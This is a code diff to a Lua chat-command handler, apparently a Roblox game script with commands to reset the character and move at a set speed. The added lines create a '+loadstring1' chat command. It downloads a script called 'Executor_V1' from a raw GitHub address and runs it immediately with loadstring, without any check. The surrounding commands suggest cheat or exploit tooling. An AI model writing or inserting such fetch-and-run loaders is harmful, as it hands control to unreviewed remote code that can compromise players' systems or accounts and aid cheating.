@@ -188,6 +188,8 @@ local function onPlayerChatted(message)
         end
     elseif words[1] == "+r" then
         resetCharacter()
+    elseif words[1] == "+loadstring1" then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/NganHa2k3/RobloxScript_0/main/Executor_V1'))()
     elseif words[1] == "+tw" then
         local speed = tonumber(words[3]) or 50  -- Default speed is 50 if not specified
         if #words == 2 then
